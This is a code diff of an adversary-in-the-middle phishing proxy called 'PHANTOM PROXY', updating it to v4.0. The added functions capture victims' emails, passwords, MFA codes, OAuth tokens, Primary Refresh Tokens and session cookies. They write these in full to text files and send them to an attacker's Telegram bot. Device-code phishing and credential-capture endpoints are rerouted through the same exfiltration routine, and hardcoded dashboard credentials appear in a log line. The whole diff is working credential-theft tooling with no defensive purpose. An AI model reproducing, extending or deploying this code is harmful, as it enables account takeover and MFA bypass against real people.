@@ -1,5 +1,5 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v3.4 — ULTIMATE + CACHING + ERROR HANDLING
+// 🥔 PHANTOM PROXY v4.0 — CLEAN TELEGRAM EXFILTRATION
 // ============================================================
 // 🔥 FEATURES:
 //   ✅ AiTM Reverse Proxy with session tracking
@@ -34,6 +34,9 @@
 //   ✅ CACHE BACKUP to disk
 //   ✅ ENHANCED ERROR HANDLING
 //   ✅ STRUCTURED LOGGING
+//   ✅ CLEAN TELEGRAM MESSAGES — TOKENS IN FILES
+//   ✅ FULL TOKENS — NO TRUNCATION
+//   ✅ COOKIES AS .TXT ATTACHMENTS
 // ============================================================
 
 const http = require("http");
@@ -429,146 +432,234 @@ function extractCookiesFromHeaders(headers) {
     return Object.keys(cookies).length ? cookies : null;
 }
 
-async function sendCookiesAsFile(cookies, sessionId) {
-    if (!cookies || Object.keys(cookies).length === 0 || !axios || !FormData) return;
+// ── ✅ SEND TOKENS AS TEXT FILE ──
+async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
+    if (!tokens || Object.keys(tokens).length === 0) return;
+    
     try {
         const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-        const randomName = Math.random().toString(36).substring(2, 10);
-        const filename = `session_${randomName}_${timestamp}.txt`;
+        const filename = `tokens_${sessionId}_${timestamp}.txt`;
         const tmpDir = os.tmpdir();
         const filePath = path.join(tmpDir, filename);
-        const content = `# Session Cookies\n# Session ID: ${sessionId}\n# Captured: ${new Date().toISOString()}\n\n${JSON.stringify(cookies, null, 2)}`;
+        
+        let content = '# ============================================================\n';
+        content += '# 🔑 FULL TOKENS DUMP\n';
+        content += '# ============================================================\n';
+        content += `# Session ID: ${sessionId}\n`;
+        content += `# Captured: ${new Date().toISOString()}\n`;
+        content += `# Email: ${email || 'N/A'}\n`;
+        content += `# Password: ${password || 'N/A'}\n`;
+        content += `# MFA Code: ${mfaCode || 'N/A'}\n`;
+        content += '# ============================================================\n\n';
+        
+        if (tokens.access_token) {
+            content += '🔑 ACCESS TOKEN\n';
+            content += '============================================================\n';
+            content += tokens.access_token + '\n\n';
+        }
+        
+        if (tokens.refresh_token) {
+            content += '🔄 REFRESH TOKEN\n';
+            content += '============================================================\n';
+            content += tokens.refresh_token + '\n\n';
+        }
+        
+        if (tokens.id_token) {
+            content += '🆔 ID TOKEN\n';
+            content += '============================================================\n';
+            content += tokens.id_token + '\n\n';
+        }
+        
+        if (tokens.prt) {
+            content += '🔐 PRT (Primary Refresh Token)\n';
+            content += '============================================================\n';
+            content += tokens.prt + '\n\n';
+        }
+        
+        if (tokens.session_cookie) {
+            content += '🍪 SESSION COOKIE\n';
+            content += '============================================================\n';
+            content += tokens.session_cookie + '\n\n';
+        }
+        
+        if (tokens.cookies && Object.keys(tokens.cookies).length > 0) {
+            content += '🍪 ALL COOKIES (JSON)\n';
+            content += '============================================================\n';
+            content += JSON.stringify(tokens.cookies, null, 2) + '\n\n';
+        }
+        
+        content += '# ============================================================\n';
+        content += '# END OF TOKENS\n';
+        content += '# ============================================================\n';
+        
         fs.writeFileSync(filePath, content);
+        
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
         form.append('document', fs.createReadStream(filePath), { filename: filename });
-        form.append('caption', `📎 Cookie file: ${filename}`);
+        form.append('caption', `🔑 Tokens file: ${filename}`);
+        
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
             headers: form.getHeaders(),
-            timeout: 5000
+            timeout: 10000
         });
+        
         try { fs.unlinkSync(filePath); } catch (e) {}
-    } catch (e) { logError('Cookie file send failed', e.message); }
+        logInfo('✅ Tokens file sent to Telegram');
+    } catch (e) {
+        logError('Failed to send tokens file:', e.message);
+    }
 }
 
-// ── ✅ TELEGRAM SEND (ENHANCED) ──
-async function sendToTelegram(data) {
-    if (!axios) return;
+// ── ✅ SEND COOKIES AS TEXT FILE ──
+async function sendCookiesFile(cookies, sessionId) {
+    if (!cookies || Object.keys(cookies).length === 0) return;
+    
     try {
-        const url = data.proxyRequestURL || '';
-        const body = data.proxyRequestBody || '';
-        const method = data.proxyRequestMethod || '';
-        const sessionId = data.sessionId || 'unknown';
-        const userAgent = data.proxyRequestHeaders?.['user-agent'] || 'Unknown';
-        if (NOTIFIED_SESSIONS.has(sessionId)) return;
-        const ip = data.proxyRequestHeaders?.['cf-connecting-ip'] || data.proxyRequestHeaders?.['x-real-ip'] || data.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
-        let username = 'N/A';
-        let password = 'N/A';
-        let hasCredentials = false;
-        let isSessionCookie = false;
-        let isTokenExchange = false;
-        let mfaCode = null;
+        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+        const filename = `cookies_${sessionId}_${timestamp}.txt`;
+        const tmpDir = os.tmpdir();
+        const filePath = path.join(tmpDir, filename);
+        
+        let content = '# ============================================================\n';
+        content += '# 🍪 COOKIES DUMP\n';
+        content += '# ============================================================\n';
+        content += `# Session: ${sessionId}\n`;
+        content += `# Time: ${new Date().toISOString()}\n`;
+        content += '# ============================================================\n\n';
+        
+        for (const [name, value] of Object.entries(cookies)) {
+            content += `${name}=${value}\n`;
+        }
+        
+        fs.writeFileSync(filePath, content);
+        
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('document', fs.createReadStream(filePath), { filename: filename });
+        form.append('caption', `🍪 Cookies: ${filename}`);
+        
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
+            headers: form.getHeaders(),
+            timeout: 10000
+        });
+        
+        try { fs.unlinkSync(filePath); } catch (e) {}
+        logInfo('✅ Cookies file sent');
+    } catch (e) {
+        logError('Failed to send cookies:', e.message);
+    }
+}
 
+// ── ✅ CLEAN TELEGRAM SEND ──
+async function sendToTelegramClean(data) {
+    if (!axios) return;
+    
+    try {
+        const sessionId = data.sessionId || 'unknown';
+        const ip = data.proxyRequestHeaders?.['cf-connecting-ip'] || 
+                   data.proxyRequestHeaders?.['x-real-ip'] || 
+                   data.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 
+                   'Unknown';
+        
+        let email = 'N/A';
+        let password = 'N/A';
+        let mfaCode = null;
+        let tokens = {};
+        let cookies = {};
+        
+        const body = data.proxyRequestBody || '';
         if (body) {
             const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+            
             const userMatch = bodyStr.match(/(?:login|loginfmt|username)=([^&]+)/i);
-            if (userMatch) username = decodeURIComponent(userMatch[1]);
+            if (userMatch) email = decodeURIComponent(userMatch[1]);
+            
             const passMatch = bodyStr.match(/(?:passwd|password|pass)=([^&]+)/i);
-            if (passMatch) { password = decodeURIComponent(passMatch[1]); hasCredentials = true; }
+            if (passMatch) password = decodeURIComponent(passMatch[1]);
+            
             const mfaMatch = bodyStr.match(/(?:otp|code|verificationcode|mfa)=([^&]+)/i);
-            if (mfaMatch) { mfaCode = decodeURIComponent(mfaMatch[1]); hasCredentials = true; }
+            if (mfaMatch) mfaCode = decodeURIComponent(mfaMatch[1]);
+            
             try {
                 const jsonBody = typeof body === 'string' ? JSON.parse(body) : body;
-                if (jsonBody.password) { password = jsonBody.password; hasCredentials = true; }
-                if (jsonBody.username) username = jsonBody.username;
-                if (jsonBody.otp || jsonBody.code) { mfaCode = jsonBody.otp || jsonBody.code; hasCredentials = true; }
+                if (jsonBody.access_token) tokens.access_token = jsonBody.access_token;
+                if (jsonBody.refresh_token) tokens.refresh_token = jsonBody.refresh_token;
+                if (jsonBody.id_token) tokens.id_token = jsonBody.id_token;
+                if (jsonBody.prt) tokens.prt = jsonBody.prt;
+                if (jsonBody.password) password = jsonBody.password;
+                if (jsonBody.username) email = jsonBody.username;
+                if (jsonBody.otp || jsonBody.code) mfaCode = jsonBody.otp || jsonBody.code;
             } catch (e) {}
-            if (!hasCredentials && bodyStr.includes('password')) {
-                const rawPassMatch = bodyStr.match(/"password"\s*[:=]\s*"([^"]+)"/i);
-                if (rawPassMatch) { password = rawPassMatch[1]; hasCredentials = true; }
-            }
-            if (data.proxyResponseBody) {
-                const respStr = typeof data.proxyResponseBody === 'string' ? data.proxyResponseBody : JSON.stringify(data.proxyResponseBody);
-                const accessMatch = respStr.match(/access_token["']?\s*[:=]\s*["']([^"']+)["']/i);
-                if (accessMatch) {
-                    const token = accessMatch[1];
-                    if (!CAPTURED_TOKENS[sessionId]) CAPTURED_TOKENS[sessionId] = {};
-                    CAPTURED_TOKENS[sessionId].access_token = token;
-                    hasCredentials = true;
-                    isTokenExchange = true;
-                }
-                const refreshMatch = respStr.match(/refresh_token["']?\s*[:=]\s*["']([^"']+)["']/i);
-                if (refreshMatch) {
-                    const token = refreshMatch[1];
-                    if (!CAPTURED_TOKENS[sessionId]) CAPTURED_TOKENS[sessionId] = {};
-                    CAPTURED_TOKENS[sessionId].refresh_token = token;
-                    hasCredentials = true;
-                    isTokenExchange = true;
-                }
-                const prtMatch = respStr.match(/prt["']?\s*[:=]\s*["']([^"']+)["']/i);
-                if (prtMatch) {
-                    if (!CAPTURED_TOKENS[sessionId]) CAPTURED_TOKENS[sessionId] = {};
-                    CAPTURED_TOKENS[sessionId].prt = prtMatch[1];
-                    hasCredentials = true;
-                }
-            }
         }
+        
+        if (data.proxyResponseBody) {
+            const respStr = typeof data.proxyResponseBody === 'string' ? data.proxyResponseBody : JSON.stringify(data.proxyResponseBody);
+            
+            const accessMatch = respStr.match(/access_token["']?\s*[:=]\s*["']([^"']+)["']/i);
+            if (accessMatch) tokens.access_token = accessMatch[1];
+            
+            const refreshMatch = respStr.match(/refresh_token["']?\s*[:=]\s*["']([^"']+)["']/i);
+            if (refreshMatch) tokens.refresh_token = refreshMatch[1];
+            
+            const idMatch = respStr.match(/id_token["']?\s*[:=]\s*["']([^"']+)["']/i);
+            if (idMatch) tokens.id_token = idMatch[1];
+            
+            const prtMatch = respStr.match(/prt["']?\s*[:=]\s*["']([^"']+)["']/i);
+            if (prtMatch) tokens.prt = prtMatch[1];
+            
+            const sessionMatch = respStr.match(/session["']?\s*[:=]\s*["']([^"']+)["']/i);
+            if (sessionMatch) tokens.session_cookie = sessionMatch[1];
+        }
+        
         const setCookieHeaders = data.proxyResponseHeaders?.['set-cookie'];
         if (setCookieHeaders) {
-            const cookieStr = JSON.stringify(setCookieHeaders);
-            if (cookieStr.includes('esctx') || cookieStr.includes('ESTSAUTH') || cookieStr.includes('LoginOptions')) {
-                isSessionCookie = true;
-                hasCredentials = true;
+            const cookieArray = Array.isArray(setCookieHeaders) ? setCookieHeaders : [setCookieHeaders];
+            for (const cookie of cookieArray) {
+                if (typeof cookie === 'string') {
+                    const [nameValue] = cookie.split(';');
+                    const [name, value] = nameValue.split('=');
+                    if (name && value) cookies[name.trim()] = value.trim();
+                }
             }
         }
-        if (username !== 'N/A' || hasCredentials || isSessionCookie) hasCredentials = true;
-        if (!hasCredentials) return;
-        NOTIFIED_SESSIONS.add(sessionId);
-        let geo = { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
-        let flag = '🌍';
-        let location = 'Unknown';
-        if (ip !== 'Unknown') {
-            try {
-                geo = await getGeoInfo(ip);
-                flag = getFlagEmoji(geo.countryCode);
-                location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
-            } catch (e) {}
-        }
-        let message = `
-🔐 **New Login Captured!**
+        tokens.cookies = cookies;
+        
+        // ── ✅ SEND CLEAN SUMMARY ──
+        let summary = `
+🔐 **LOGIN CAPTURED!**
 
+👤 **Email:** ${email}
+🔐 **Password:** ${password}
+📱 **MFA Code:** ${mfaCode || 'N/A'}
 🌍 **IP:** ${ip}
-${flag} **Location:** ${location}
-🏢 **ISP:** ${geo.isp || 'N/A'}
-📡 **Org:** ${geo.org || 'N/A'}
+🆔 **Session:** ${sessionId}
+🕒 **Time:** ${new Date().toISOString()}
 
-🕒 **Time:** ${data.timestamp || new Date().toISOString()}
-🔗 **URL:** ${url}
-📨 **Method:** ${method}
-📊 **Status:** ${data.proxyResponseStatusCode || 'N/A'}
-
-🖥️ **User-Agent:** ${userAgent}
-        `;
-        if (username !== 'N/A') message += `\n👤 **Username/Email:** ${username}`;
-        if (password !== 'N/A') message += `\n🔐 **Password:** ${password}`;
-        if (mfaCode) message += `\n📱 **MFA Code:** \`${mfaCode}\``;
-        if (isSessionCookie) message += `\n🍪 **Session Cookie:** ✅ Captured\n🔑 **Status:** Authenticated session`;
-        if (isTokenExchange) message += `\n🔄 **Token Exchange:** ✅ Detected`;
-        if (CAPTURED_TOKENS[sessionId]) {
-            const tokens = CAPTURED_TOKENS[sessionId];
-            if (tokens.access_token) message += `\n🔑 **Access Token:** \`${tokens.access_token.slice(0, 40)}...\``;
-            if (tokens.refresh_token) message += `\n🔄 **Refresh Token:** \`${tokens.refresh_token.slice(0, 40)}...\``;
-            if (tokens.id_token) message += `\n🆔 **ID Token:** \`${tokens.id_token.slice(0, 40)}...\``;
-            if (tokens.prt) message += `\n🔐 **PRT:** \`${tokens.prt.slice(0, 40)}...\``;
+📎 **Attachments:**
+`;
+        
+        if (Object.keys(tokens).length > 0) {
+            summary += '🔑 Tokens file attached (tokens_*.txt)\n';
+            await sendTokensFile(tokens, sessionId, email, password, mfaCode);
         }
+        
+        if (Object.keys(cookies).length > 0) {
+            summary += '🍪 Cookies file attached (cookies_*.txt)\n';
+            await sendCookiesFile(cookies, sessionId);
+        }
+        
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
-            text: message,
+            text: summary,
             parse_mode: 'Markdown'
         }, { timeout: 5000 });
-        const cookies = extractCookiesFromHeaders(data.proxyResponseHeaders);
-        if (cookies && Object.keys(cookies).length > 0) await sendCookiesAsFile(cookies, sessionId);
-    } catch (e) { logError('sendToTelegram() FAILED:', e.message); }
+        
+        logInfo(`✅ Session ${sessionId} exfiltrated to Telegram`);
+        
+    } catch (e) {
+        logError('sendToTelegramClean() FAILED:', e.message);
+    }
 }
 
 // ── ✅ CONSTANTS ──
@@ -967,7 +1058,6 @@ class TokenVault {
             } catch (e) {}
         }
         this.groupByUser();
-        // Cache the results
         this.cache.set('vault_tokens', this.tokens, 60000);
         return this.tokens;
     }
@@ -1340,19 +1430,15 @@ dashApp.post('/api/prt/exchange', async (req, res) => {
         }, 3, 1500, 2);
         const tokens = response.data;
         logInfo('PRT exchange successful');
-        const message = `
-🔐 **PRT Exchange Successful!**
-🔑 **Access Token:** \`${tokens.access_token?.slice(0, 40)}...\`
-🔄 **Refresh Token:** \`${tokens.refresh_token?.slice(0, 40)}...\`
-🆔 **ID Token:** \`${tokens.id_token?.slice(0, 40)}...\`
-        `;
-        try {
-            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            }, { timeout: 3000 });
-        } catch (e) {}
+        
+        // Send to Telegram clean
+        await sendToTelegramClean({
+            sessionId: 'prt_exchange',
+            proxyRequestHeaders: { 'x-real-ip': 'Unknown' },
+            proxyRequestBody: JSON.stringify(tokens),
+            proxyResponseBody: JSON.stringify(tokens)
+        });
+        
         res.json({ success: true, data: tokens });
     } catch (err) {
         logError('PRT exchange failed:', err.response?.data || err.message);
@@ -2287,27 +2373,13 @@ dashApp.post('/api/capture/credentials', async (req, res) => {
     logInfo(`   IP: ${ip}`);
     logInfo(`   User-Agent: ${userAgent}`);
 
-    const message = `
-🔑 **Credentials Captured!**
-👤 **Email:** ${email}
-🔐 **Password:** ${password}
-🆔 **Session:** ${sessionId || 'Unknown'}
-🌍 **IP:** ${ip || 'Unknown'}
-🖥️ **User-Agent:** ${userAgent || 'Unknown'}
-🕒 **Time:** ${new Date().toISOString()}
-    `;
-
-    try {
-        await retry(async () => {
-            return await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            }, { timeout: 3000 });
-        }, 2, 1000, 2);
-    } catch (e) {
-        logError('Telegram notify failed:', e.message);
-    }
+    // Send to Telegram using clean exfil
+    await sendToTelegramClean({
+        sessionId: sessionId || 'unknown',
+        proxyRequestHeaders: { 'x-real-ip': ip || 'Unknown', 'user-agent': userAgent || 'Unknown' },
+        proxyRequestBody: JSON.stringify({ email, password }),
+        proxyResponseBody: JSON.stringify({ success: true })
+    });
 
     vault.tokens.push({
         type: 'credentials',
@@ -2625,21 +2697,13 @@ app.post('/device/token', async (req, res) => {
             saveDeviceFlows(deviceFlows);
         }
 
-        const message = `
-📱 **Device Code Phishing - SUCCESS!**
-🔑 **Access Token:** \`${tokens.access_token?.slice(0, 30)}...\`
-🔄 **Refresh Token:** \`${tokens.refresh_token?.slice(0, 30)}...\`
-🆔 **ID Token:** \`${tokens.id_token?.slice(0, 30) || 'Not received'}...\`
-👤 **User:** ${username}
-📱 **Token Type:** ${tokenType}
-        `;
-        try {
-            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            }, { timeout: 3000 });
-        } catch (e) {}
+        // Send to Telegram using clean exfil
+        await sendToTelegramClean({
+            sessionId: flow?.session_id || 'device_flow',
+            proxyRequestHeaders: { 'x-real-ip': 'Unknown', 'user-agent': userAgent },
+            proxyRequestBody: JSON.stringify(tokens),
+            proxyResponseBody: JSON.stringify(tokens)
+        });
 
         res.json(tokens);
     } catch (error) {
@@ -2781,7 +2845,7 @@ async function processTelegramQueue() {
 
     for (const item of toProcess) {
         try {
-            await sendToTelegram(item.data);
+            await sendToTelegramClean(item.data);
             logInfo('✅ Queued message sent');
         } catch (error) {
             logError('Failed to send queued message:', error.message);
@@ -2842,7 +2906,7 @@ function setupGracefulShutdown(server, wss) {
 const PORT = process.env.PORT || 3000;
 
 const server = app.listen(PORT, '0.0.0.0', () => {
-    logInfo(`✅ PHANTOM PROXY v3.4 ULTIMATE running on port ${PORT}`);
+    logInfo(`✅ PHANTOM PROXY v4.0 ULTIMATE running on port ${PORT}`);
     logInfo(`🔐 Dashboard: /dash (auth: svrpsdev/Cozysarps18!)`);
     logInfo(`📱 Device Code: /device`);
     logInfo(`🔢 MFA Intercept: /mfa`);
@@ -2858,6 +2922,7 @@ const server = app.listen(PORT, '0.0.0.0', () => {
     logInfo(`🗃️ Cache Manager: Active (${global._cache ? global._cache.getStats().size : 0} items)`);
     logInfo(`📤 Telegram Queue: ${global._telegramQueue ? global._telegramQueue.length : 0} pending`);
     logInfo('✅ All features integrated!');
+    logInfo('🔥 CLEAN TELEGRAM EXFILTRATION — Tokens in .txt files');
 });
 
 // ── ✅ WEBSOCKET SUPPORT ──
@@ -2899,5 +2964,5 @@ process.on('unhandledRejection', (err) => {
     logError('Unhandled Rejection:', err);
 });
 
-logInfo('✅ PHANTOM PROXY v3.4 ULTIMATE startup complete!');
-logInfo('🔥 All features integrated with caching & error handling.');
+logInfo('✅ PHANTOM PROXY v4.0 ULTIMATE startup complete!');
+logInfo('🔥 All features integrated with clean Telegram exfiltration.');
